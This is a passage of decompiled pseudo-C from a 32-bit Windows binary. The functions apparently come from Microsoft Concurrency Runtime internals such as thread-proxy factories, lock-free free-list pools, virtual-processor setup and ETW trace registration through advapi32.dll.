  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493EDC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (004566CB) --------------------------------------------------------
_DWORD *__thiscall sub_4566CB(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::FreeThreadProxy::`vftable';
  sub_45C847(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493EC0: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (004566F3) --------------------------------------------------------
_DWORD *__thiscall sub_4566F3(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493EDC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (00456716) --------------------------------------------------------
_DWORD *__thiscall sub_456716(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493EDC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (00456739) --------------------------------------------------------
_DWORD *__thiscall sub_456739(void *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x44u);
  result = 0;
  if ( v3 )
    return sub_456597(v3, (int)this, a2);
  return result;
}

//----- (0045676E) --------------------------------------------------------
int __cdecl sub_45676E(int a1)
{
  void *v1; // ecx
  int result; // eax

  sub_456A5C();
  v1 = operator new(0x30u);
  result = 0;
  if ( v1 )
    return sub_4565CC((int)v1, a1);
  return result;
}

//----- (004567A3) --------------------------------------------------------
int __thiscall sub_4567A3(char *this)
{
  if ( !*(_DWORD *)this )
  {
    sub_44A1E8((LPCRITICAL_SECTION)(this + 12));
    if ( !*(_DWORD *)this )
      *(_DWORD *)this = sub_45676E((int)this);
    sub_44A32E((LPCRITICAL_SECTION)(this + 12));
  }
  return *(_DWORD *)this;
}

//----- (004567EB) --------------------------------------------------------
int __stdcall sub_4567EB(_DWORD *a1, int nPriority)
{
  int result; // eax

  result = nPriority;
  if ( a1[6] != nPriority )
    return sub_45C8E9(a1, nPriority);
  return result;
}

//----- (00456803) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_456803(char *this, struct _SINGLE_LIST_ENTRY *a2)
{
  PSLIST_ENTRY result; // eax
  union _SLIST_HEADER *v4; // edi

  result = 0;
  while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_493EF4[(_DWORD)result] )
  {
    result = (PSLIST_ENTRY)((char *)result + 1);
    if ( (int)result >= 4 )
      goto LABEL_4;
  }
  v4 = (union _SLIST_HEADER *)&this[8 * (_DWORD)result + 8];
  result = (PSLIST_ENTRY)QueryDepthSList(v4);
  if ( (unsigned __int16)result < dword_500080 )
    return InterlockedPushEntrySList(v4, a2 + 15);
LABEL_4:
  if ( a2 )
    return (PSLIST_ENTRY)(*(int (__thiscall **)(char *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, a2);
  return result;
}
// 493EF4: using guessed type int dword_493EF4[4];
// 500080: using guessed type int dword_500080;

//----- (00456864) --------------------------------------------------------
void __thiscall sub_456864(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2)
{
  int v3; // eax
  union _SLIST_HEADER *v4; // edi
  PSLIST_ENTRY v5; // eax
  int i; // edx
  int v7; // edi

  if ( this[44] )
    goto LABEL_5;
  v3 = 0;
  while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_493EF4[v3] )
  {
    if ( ++v3 >= 4 )
      goto LABEL_5;
  }
  v4 = (union _SLIST_HEADER *)&this[8 * v3 + 8];
  if ( QueryDepthSList(v4) >= dword_500080 )
  {
LABEL_5:
    if ( a2 )
      (*(void (__thiscall **)(_BYTE *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, a2);
  }
  else
  {
    InterlockedPushEntrySList(v4, a2 + 15);
    if ( this[44] )
    {
      v5 = InterlockedFlushSList(v4);
      for ( i = v5 != 0 ? (unsigned int)&v5[-15] : 0; i; i = v7 != 0 ? v7 - 60 : 0 )
      {
        v7 = *(_DWORD *)(i + 60);
        (*(void (__thiscall **)(_BYTE *, int))(*(_DWORD *)this + 32))(this, i);
      }
    }
  }
}
// 493EF4: using guessed type int dword_493EF4[4];
// 500080: using guessed type int dword_500080;

//----- (00456907) --------------------------------------------------------
signed __int32 __thiscall sub_456907(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 10);
}

//----- (00456911) --------------------------------------------------------
signed __int32 __thiscall sub_456911(volatile signed __int32 *this)
{
  signed __int32 v1; // ebx

  v1 = _InterlockedDecrement(this + 10);
  if ( !v1 && this )
    (*(void (__thiscall **)(volatile signed __int32 *, int))(*this + 20))(this, 1);
  return v1;
}

//----- (0045693E) --------------------------------------------------------
int __thiscall sub_45693E(union _SLIST_HEADER *this, unsigned int a2, int a3)
{
  unsigned int v4; // ecx
  int *v5; // esi
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // edi
  union _SLIST_HEADER *v10; // [esp+Ch] [ebp-4h]

  v4 = a2;
  v5 = dword_493EF4;
  v6 = this + 1;
  v10 = this + 1;
  do
  {
    if ( v4 <= *v5 )
    {
      v7 = InterlockedPopEntrySList(v6);
      v8 = v7 != 0 ? (unsigned int)&v7[-15] : 0;
      if ( v8 )
        goto LABEL_7;
      v6 = v10;
      v4 = a2;
    }
    ++v5;
    v10 = ++v6;
  }
  while ( (int)v5 < (int)&off_493F04 );
  v8 = ((int (__thiscall *)(union _SLIST_HEADER *, unsigned int))this->Next.Next[7].Next)(this, v4);
  if ( !v8 )
    return v8;
LABEL_7:
  ((void (__thiscall *)(union _SLIST_HEADER *, int, int))this->Next.Next[9].Next)(this, v8, a3);
  return v8;
}
// 456988: conditional instruction was optimized away because edi.4==0
// 493EF4: using guessed type int dword_493EF4[4];
// 493F04: using guessed type int off_493F04;

//----- (004569C0) --------------------------------------------------------
BOOL __stdcall sub_4569C0(_DWORD *a1)
{
  return sub_45C8CA(a1);
}

//----- (004569CF) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_4569CF(union _SLIST_HEADER *this)
{
  int v1; // esi
  union _SLIST_HEADER *v2; // ebx
  PSLIST_ENTRY result; // eax
  int v4; // edx
  int v5; // edi
  int v7; // [esp+10h] [ebp-8h]
  union _SLIST_HEADER *v8; // [esp+14h] [ebp-4h]

  v1 = 4;
  v2 = this + 1;
  v8 = this + 1;
  v7 = 4;
  do
  {
    result = InterlockedFlushSList(v2);
    v4 = result != 0 ? (unsigned int)&result[-15] : 0;
    if ( v4 )
    {
      do
      {
        v5 = *(_DWORD *)(v4 + 60);
        ((void (__thiscall *)(union _SLIST_HEADER *, int))this->Next.Next[8].Next)(this, v4);
        result = (PSLIST_ENTRY)(v5 - 60);
        v4 = v5 != 0 ? v5 - 60 : 0;
      }
      while ( v4 );
      v2 = v8;
      v1 = v7;
    }
    ++v2;
    --v1;
    v8 = v2;
    v7 = v1;
  }
  while ( v1 );
  return result;
}

//----- (00456A3B) --------------------------------------------------------
int __thiscall sub_456A3B(int this)
{
  *(_BYTE *)(this + 44) = 1;
  sub_4569CF((union _SLIST_HEADER *)this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)this + 12))(this);
}

//----- (00456A5C) --------------------------------------------------------
void sub_456A5C()
{
  if ( !dword_500080 )
    dword_500080 = 4 * sub_44CE93();
}
// 500080: using guessed type int dword_500080;

//----- (00456A78) --------------------------------------------------------
int *__thiscall sub_456A78(int *this)
{
  HMODULE Library; // esi
  ULONG (__stdcall *RegisterTraceGuidsW)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE); // eax
  ULONG (__stdcall *UnregisterTraceGuids)(TRACEHANDLE); // eax
  ULONG (__stdcall *TraceEvent)(TRACEHANDLE, PEVENT_TRACE_HEADER); // eax
  TRACEHANDLE (__stdcall *GetTraceLoggerHandle)(PVOID); // eax
  UCHAR (__stdcall *GetTraceEnableLevel)(TRACEHANDLE); // eax
  ULONG (__stdcall *GetTraceEnableFlags)(TRACEHANDLE); // eax

  Library = LoadLibraryExW(L"advapi32.dll", 0, 0x800u);
  if ( Library || GetLastError() == 87 && (Library = LoadLibraryW(L"advapi32.dll")) != 0 )
  {
    RegisterTraceGuidsW = (ULONG (__stdcall *)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE))GetProcAddress(Library, "RegisterTraceGuidsW");
    *this = sub_44AB76((int)RegisterTraceGuidsW);
    UnregisterTraceGuids = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "UnregisterTraceGuids");
    this[1] = sub_44AB76((int)UnregisterTraceGuids);
    TraceEvent = (ULONG (__stdcall *)(TRACEHANDLE, PEVENT_TRACE_HEADER))GetProcAddress(Library, "TraceEvent");
    this[2] = sub_44AB76((int)TraceEvent);
    GetTraceLoggerHandle = (TRACEHANDLE (__stdcall *)(PVOID))GetProcAddress(Library, "GetTraceLoggerHandle");
    this[3] = sub_44AB76((int)GetTraceLoggerHandle);
    GetTraceEnableLevel = (UCHAR (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableLevel");
    this[4] = sub_44AB76((int)GetTraceEnableLevel);
    GetTraceEnableFlags = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableFlags");
    this[5] = sub_44AB76((int)GetTraceEnableFlags);
  }
  return this;
}

//----- (00456B72) --------------------------------------------------------
DWORD __stdcall sub_456B72(int a1, int a2, int a3, int a4)
{
  DWORD result; // eax
  int v5; // edx
  char v6; // bl
  int v7; // eax

  if ( a1 == 4 )
  {
    dword_500090 = sub_456CB2(dword_500098, a4);
    dword_500094 = v5;
    if ( dword_500090 == -1 )
      return GetLastError();
    SetLastError(0);
    v6 = sub_456C75(dword_500098, dword_500090, dword_500094);
    if ( !v6 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v6 = 4;
    }
    v7 = sub_456C38(dword_500098, dword_500090, dword_500094);
    if ( !v7 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v7 = -1;
    }
    dword_500088 = v7;
    byte_50008C = v6;
  }
  else
  {
    if ( a1 != 5 )
      return 87;
    byte_50008C = 0;
    dword_500088 = 0;
    dword_500090 = 0;
    dword_500094 = 0;
  }
  return 0;
}
// 456BB9: variable 'v5' is possibly undefined
// 500088: using guessed type int dword_500088;
// 50008C: using guessed type char byte_50008C;
// 500090: using guessed type int dword_500090;
// 500094: using guessed type int dword_500094;

//----- (00456C38) --------------------------------------------------------
int __thiscall sub_456C38(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[5];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_44AB76((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (00456C75) --------------------------------------------------------
char __thiscall sub_456C75(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[4];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_44AB76((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (00456CB2) --------------------------------------------------------
int __thiscall sub_456CB2(_DWORD *this, int a2)
{
  PVOID v2; // esi
  int (__thiscall *v3)(_DWORD, int); // esi

  v2 = (PVOID)this[3];
  if ( v2 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return -1;
  }
  else
  {
    v3 = (int (__thiscall *)(_DWORD, int))sub_44AB76((int)v2);
    return v3(v3, a2);
  }
}

//----- (00456CEF) --------------------------------------------------------
int __thiscall sub_456CEF(void **this, int a2, int a3, int a4, int a5, int a6)
{
  PVOID v6; // esi
  int (__thiscall *v7)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int); // esi

  v6 = *this;
  if ( v6 == EncodePointer(0) )
    return 127;
  v7 = (int (__thiscall *)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int))sub_44AB76((int)v6);
  return v7(v7, a2, 0, a3, a4, a5, 0, 0, a6);
}

//----- (00456D33) --------------------------------------------------------
int __thiscall sub_456D33(_DWORD *this, int a2, int a3, int a4)
{
  PVOID v4; // esi
  int (__thiscall *v5)(_DWORD, int, int, int); // esi

  v4 = (PVOID)this[2];
  if ( v4 == EncodePointer(0) )
    return 127;
  v5 = (int (__thiscall *)(_DWORD, int, int, int))sub_44AB76((int)v4);
  return v5(v5, a2, a3, a4);
}

//----- (00456D6C) --------------------------------------------------------
int __thiscall sub_456D6C(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[1];
  if ( v3 == EncodePointer(0) )
    return 127;
  v4 = (int (__thiscall *)(_DWORD, int, int))sub_44AB76((int)v3);
  return v4(v4, a2, a3);
}

//----- (00456DA2) --------------------------------------------------------
__int32 sub_456DA2()
{
  __int32 result; // eax
  int *v1; // eax
  int *v2; // eax

  result = sub_44AE22(&dword_50006C);
  if ( !dword_500098 )
  {
    v1 = (int *)operator new(0x18u);
    if ( v1 )
      v2 = sub_456A78(v1);
    else
      v2 = 0;
    dword_500098 = v2;
    result = sub_456CEF((void **)v2, (int)sub_456B72, (int)&unk_493F5C, 7, (int)&off_4F8080, (int)&dword_5000A0);
  }
  dword_50006C = 0;
  return result;
}
// 4F8080: using guessed type void *off_4F8080;
// 50006C: using guessed type int dword_50006C;
// 5000A0: using guessed type int dword_5000A0;

//----- (00456E11) --------------------------------------------------------
void sub_456E11()
{
  if ( dword_500098 )
  {
    byte_50008C = 0;
    dword_500088 = 0;
    sub_456D6C(dword_500098, dword_5000A0, dword_5000A4);
    sub_44775B(dword_500098);
    dword_500098 = 0;
  }
}
// 500088: using guessed type int dword_500088;
// 50008C: using guessed type char byte_50008C;
// 5000A0: using guessed type int dword_5000A0;
// 5000A4: using guessed type int dword_5000A4;

//----- (00456E54) --------------------------------------------------------
int __cdecl sub_456E54(int (__thiscall ***a1)(_DWORD, int))
{
  int result; // eax

  if ( a1 )
    return (**a1)(a1, 1);
  return result;
}

//----- (00456E76) --------------------------------------------------------
_DWORD *__thiscall sub_456E76(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx
  void *v7; // [esp-8h] [ebp-2Ch]

  *this = 0;
  this[1] = 0;
  this[5] = a2;
  this[2] = 63;
  this[3] = unknown_libname_86(256);
  v3 = unknown_libname_86(512);
  if ( v3 )
  {
    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  v7 = (void *)this[3];
  this[4] = v3;
  memset(v7, 0, 0x100u);
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00456EF4) --------------------------------------------------------
_DWORD *__thiscall sub_456EF4(_DWORD *this)
{
  _DWORD *v2; // esi

  v2 = this + 33;
  *this = &Concurrency::details::VirtualProcessor::`vftable';
  sub_456E76(this + 4, (int)(this + 33));
  this[10] = 0;
  this[11] = 0;
  this[18] = 0;
  this[19] = 0;
  *v2 = 0;
  this[37] = 0;
  this[38] = 0;
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[48] = 0;
  return this;
}
// 4940C4: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (00456F54) --------------------------------------------------------
void __thiscall sub_456F54(void *this)
{
  *(_DWORD *)this = &Concurrency::details::VirtualProcessor::`vftable';
  if ( *((_DWORD *)this + 23) )
  {
    sub_451FE3(*((char **)this + 23));
    *((_DWORD *)this + 23) = 0;
  }
  j_j__free(*((void **)this + 42));
  sub_452B49((void **)this + 4);
}
// 4940C4: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (00456FB4) --------------------------------------------------------
void *__thiscall sub_456FB4(void *Block, char a2)
{
  sub_456F54(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00456FD9) --------------------------------------------------------
bool __thiscall sub_456FD9(_DWORD *this, unsigned int a2)
{
  volatile signed __int32 *v2; // edi
  int v3; // edx
  int v4; // eax

  v2 = (volatile signed __int32 *)(this[22] + 4 * (a2 >> 5));
  v3 = 1 << (a2 & 0x1F);
  v4 = v3 & *v2;
  if ( v4 )
    _InterlockedAnd(v2, ~v3);
  return v4 != 0;
}

//----- (0045700E) --------------------------------------------------------
int __thiscall sub_45700E(_DWORD *this, int a2)
{
  int result; // eax

  if ( a2 )
  {
    sub_45915F((_DWORD *)a2);
    result = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 28))(a2, this);
  }
  this[31] = a2;
  if ( a2 )
  {
    if ( (*(_BYTE *)(a2 + 179) & 1) != 0 )
    {
      ++this[27];
      *(_BYTE *)(a2 + 179) &= ~1u;
    }
  }
  return result;
}

//----- (00457057) --------------------------------------------------------
bool __thiscall sub_457057(int this)
{
  if ( !*(_BYTE *)(this + 98) )
    return sub_456FD9(**(_DWORD ***)(this + 80), *(_DWORD *)(this + 144));
  *(_BYTE *)(this + 98) = 0;
  return 1;
}

//----- (004570AA) --------------------------------------------------------
char __cdecl sub_4570AA(int a1)
{
  char result; // al
  _DWORD *v2; // esi
  int (__thiscall ***v3)(_DWORD, int); // eax

  result = sub_450C9C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    v2 = *(_DWORD **)(a1 + 16);
    while ( v2 )
    {
      v3 = (int (__thiscall ***)(_DWORD, int))(v2 - 47);
      v2 = (_DWORD *)*v2;
      sub_456E54(v3);
    }
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (004570B6) --------------------------------------------------------
char __thiscall sub_4570B6(__int32 this, __int32 *a2, int a3, char a4)
{
  volatile signed __int32 *v5; // ebx
  signed __int32 v6; // edi
  __int32 v7; // ecx
  char result; // al
  signed __int32 v9; // eax

  v5 = (volatile signed __int32 *)(this + 8);
  v6 = *(_DWORD *)(this + 8);
  if ( (v6 & a3) == 0 )
    return 0;
  if ( a3 != 15 )
  {
    while ( 1 )
    {
      v9 = _InterlockedCompareExchange(v5, 0, v6);
      v7 = v9;
      if ( v9 == v6 )
        break;
      v6 = v9;
      if ( (v9 & a3) == 0 )
        return 0;
    }
    goto LABEL_4;
  }
  v7 = _InterlockedExchange(v5, 0);
  if ( !v7 )
    return 0;
LABEL_4:
  if ( a4 )
  {
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
    _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
    if ( v7 == 4 || v7 == 8 )
    {
      _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
      _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
    }
  }
  *a2 = v7;
  a2[1] = this;
  result = 1;
  *(_DWORD *)(this + 12) = v7;
  return result;
}

//----- (00457144) --------------------------------------------------------
signed __int32 __thiscall sub_457144(_DWORD *this, int a2)
{
  signed __int32 result; // eax

  result = 1;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == 1 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, 1);
  return result;
}

//----- (00457169) --------------------------------------------------------
int __thiscall sub_457169(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 24))(this[22], a2);
}

//----- (0045718B) --------------------------------------------------------
int __thiscall sub_45718B(_DWORD **this, int a2)
{
  return (*(int (__thiscall **)(_DWORD *, int))(*this[22] + 28))(this[22], a2);
}

//----- (004571AD) --------------------------------------------------------
char __thiscall sub_4571AD(_DWORD **this, __int32 a2, int a3, struct _SINGLE_LIST_ENTRY *a4)
{
  volatile signed __int32 *v5; // esi
  int v7; // eax

  v5 = (volatile signed __int32 *)*this[20];
  if ( a2 == 1 || a2 == 4 )
  {
    if ( sub_4527A1(v5, 1) )
    {
      v7 = a3;
      if ( !a3 )
        v7 = sub_450654(v5);
      return ((int (__thiscall *)(_DWORD **, int, struct _SINGLE_LIST_ENTRY *))(*this)[7])(this, v7, a4);
    }
    else
    {
      if ( a4 )
        sub_451A84((int)v5, a4, 1);
      sub_45749E((int)this, a2, 0);
      return 0;
    }
  }
  else
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *))(*this[22] + 20))(this[22], this[32]);
    return 1;
  }
}

//----- (0045723E) --------------------------------------------------------
char __thiscall sub_45723E(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  char result; // al

  result = 0;
  if ( *(_DWORD *)this )
  {
    result = sub_4571AD(
               *(_DWORD ***)(this + 4),
               *(_DWORD *)this,
               *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(*(_DWORD *)(this + 4) + 80) + 4) + 8),
               a2);
    *(_DWORD *)this = 0;
  }
  return result;
}

//----- (00457269) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_457269(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  result = (PSLIST_ENTRY)this[23];
  if ( !result )
  {
    result = sub_450B09(0);
    this[23] = result;
  }
  return result;
}

//----- (0045727F) --------------------------------------------------------
int __thiscall sub_45727F(unsigned int *this, int a2)
{
  unsigned int *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  sub_45032E(this + 90, &a2, &v3);
  return (int)v3;
}

//----- (0045729D) --------------------------------------------------------
int __thiscall sub_45729D(int this, int a2, int a3)
{
  unsigned int **v3; // eax
  unsigned int *v4; // ebx
  int v5; // eax
  _DWORD *v6; // esi
  int v7; // eax
  __int64 v8; // rax
  int v9; // eax
  int v10; // edi
  int *v11; // eax
  unsigned int v12; // esi
  int v13; // ebx
  int v14; // eax
  int v16[4]; // [esp+Ch] [ebp-14h] BYREF
  int v17; // [esp+1Ch] [ebp-4h]

  v17 = this;
  *(_DWORD *)(this + 80) = a2;
  *(_DWORD *)(this + 200) = 0;
  *(_DWORD *)(this + 204) = 0;
  *(_DWORD *)(this + 224) = 1;
  *(_DWORD *)(this + 212) = 1;
  *(_DWORD *)(this + 120) = 0;
  *(_DWORD *)(this + 84) = *(_DWORD *)(a2 + 4);
  v3 = *(unsigned int ***)(this + 80);
  *(_WORD *)(this + 172) = 0;
  *(_DWORD *)(this + 88) = a3;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 104) = 0;
  *(_DWORD *)(this + 108) = 0;
  *(_DWORD *)(this + 112) = 0;
  *(_DWORD *)(this + 116) = 0;
  *(_DWORD *)(this + 124) = 0;
  *(_DWORD *)(this + 176) = 0;
  *(_DWORD *)(this + 192) = 0;
  *(_DWORD *)(this + 92) = 0;
  *(_WORD *)(this + 96) = 0;
  *(_BYTE *)(this + 98) = 1;
  v4 = *v3;
  *(_DWORD *)(v17 + 136) = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 16))(a3);
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)a3 + 4))(a3);
  v6 = (_DWORD *)v17;
  *(_DWORD *)(v17 + 140) = v5;
  v6[36] = sub_45727F(v4, v5);
  v7 = sub_44CE93();
  sub_450BAC(v6 + 41, v7);
  sub_457B1C(v6 + 41);
  *(_DWORD *)(v6[42] + 4 * (v6[36] >> 5)) |= 1 << (v6[36] & 0x1F);
  v8 = sub_45D10B((_DWORD *)(v17 + 40), v17, (unsigned int)(v4[3] != 0) + 1);
  v9 = (*(int (__fastcall **)(_DWORD, _DWORD))(***(_DWORD ***)(v17 + 80) + 4))(**(_DWORD **)(v17 + 80), HIDWORD(v8));
  v10 = v17;
  v11 = sub_45C998(v16, 3, *(_DWORD *)(v17 + 140), v9, v17);
  sub_452901((int *)(v10 + 148), v11);
  v12 = *(_DWORD *)(v10 + 144);
  sub_45745A(v4 + 18, v12);
  sub_457144(v4, v12);
  v13 = *(_DWORD *)(v10 + 136);
  v14 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v10 + 80) + 4))(**(_DWORD **)(v10 + 80));
  return sub_457A91(1, 4u, v14, v13);
}
// 45729D: using guessed type int var_14[4];

//----- (0045741A) --------------------------------------------------------
signed __int32 __thiscall sub_45741A(_DWORD *this, unsigned int a2)
{
  signed __int32 v3; // esi

  v3 = _InterlockedDecrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( !v3 )
  {
    sub_457932(this, a2);
    _InterlockedAnd((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), ~(1 << (a2 & 0x1F)));
  }
  return v3;
}

//----- (0045745A) --------------------------------------------------------
signed __int32 __thiscall sub_45745A(_DWORD *this, unsigned int a2)
{
  signed __int32 v2; // esi

  v2 = _InterlockedIncrement((volatile signed __int32 *)(this[2] + 4 * a2));
  if ( v2 == 1 )
  {
    sub_4578EA(this, a2);
    _InterlockedOr((volatile signed __int32 *)(this[1] + 4 * (a2 >> 5)), 1 << (a2 & 0x1F));
  }
  return v2;
}

//----- (0045749E) --------------------------------------------------------
int __thiscall sub_45749E(int this, __int32 a2, char a3)
{
  int result; // eax

  *(_DWORD *)(this + 128) = *(_DWORD *)(this + 124);
  if ( a3 && (a2 == 1 || a2 == 4) )
    sub_4527A1(**(volatile signed __int32 ***)(this + 80), 0);
  _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 436));
  _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 28));
  if ( a2 == 4 || a2 == 8 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(**(_DWORD **)(this + 80) + 440));
    _InterlockedIncrement((volatile signed __int32 *)(*(_DWORD *)(this + 80) + 32));
  }
  result = this + 8;
  _InterlockedExchange((volatile __int32 *)(this + 8), a2);
  return result;
}

//----- (0045750E) --------------------------------------------------------
char __thiscall sub_45750E(_BYTE *this)
{
  char result; // al
  __int32 v3; // esi
  int v4; // ebx
  volatile signed __int32 *v5; // edi
  int v6; // eax
  __int32 v7[2]; // [esp+Ch] [ebp-8h] BYREF

  v7[0] = 0;
  result = sub_4570B6((__int32)this, v7, 15, 1);
  if ( result )
  {
    v3 = v7[0];
    if ( v7[0] == 2 || v7[0] == 8 )
    {
      v4 = v7[1];
      this[173] = 1;
      v5 = **(volatile signed __int32 ***)(v4 + 80);
      if ( v3 == 1 || v3 == 4 )
      {
        if ( sub_4527A1(v5, 1) )
        {
          v6 = sub_450654(v5);
          return (*(int (__thiscall **)(int, int, _DWORD))(*(_DWORD *)v4 + 28))(v4, v6, 0);
        }
        else
        {
          return sub_45749E(v4, v3, 0);
        }
      }
      else
      {
        return (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(v4 + 88) + 20))(
                 *(_DWORD *)(v4 + 88),
                 *(_DWORD *)(v4 + 128));
      }
    }
    else
    {
      return (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 12))(this);
    }
  }
  else
  {
    this[173] = 1;
  }
  return result;
}

//----- (004575CA) --------------------------------------------------------
signed __int32 __thiscall sub_4575CA(int this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(**(_DWORD **)(this + 80) + 428) + 20))(
         *(_DWORD *)(**(_DWORD **)(this + 80) + 428),
         *(_DWORD *)(this + 88));
  return sub_457DDE(*(_DWORD **)(this + 80), v2, 1);
}

//----- (004575FD) --------------------------------------------------------
int __thiscall sub_4575FD(_DWORD *this)
{
  int v1; // edi
  int v2; // eax
  int v3; // edx
  __int32 v4; // ebx

  v1 = this[1] - 1;
  v2 = this[3];
  v3 = v1 & this[2];
  this[1] = v1;
  v4 = _InterlockedExchange((volatile __int32 *)(v2 + 4 * v3), 0);
  if ( !v4 )
  {
    this[1] = v1 + 1;
    return v4;
  }
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_453082((int *)(this[4] + 8 * (v1 & this[2])), 0) )
    return v4;
  return 1;
}

//----- (0045764B) --------------------------------------------------------
char __thiscall sub_45764B(PSLIST_HEADER ListHead, struct _SINGLE_LIST_ENTRY *a2, int a3, char a4)
{
  int v5; // edx
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // edx
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
